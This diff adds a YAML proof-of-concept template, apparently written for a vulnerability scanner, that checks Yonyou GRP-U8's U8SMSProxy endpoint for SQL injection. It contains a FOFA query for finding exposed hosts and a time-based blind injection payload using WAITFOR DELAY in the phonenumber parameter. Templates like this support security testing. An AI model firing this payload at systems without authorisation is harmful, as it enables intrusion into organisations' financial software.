@@ -1,0 +1,22 @@
+id: poc-yaml-yong-you-grp-u8-u8msproxy-sqli
+info:
+  name: 用友GRP-U8 U8SMSProxy SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: GRP-U8
+  fofa: app="用友-GRP-U8"
+variables:
+  t1: random_int(5,10)
+requests:
+- method: GET
+  path: /U8SMSProxy?class=XXNote&id=qrywfs&phonenumber=1'WAITFOR+DELAY+'0:0:{{.t1}}'--+
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"total\":\"0\"") &&
+
+    duration > t1
+
+    '
+transport: http
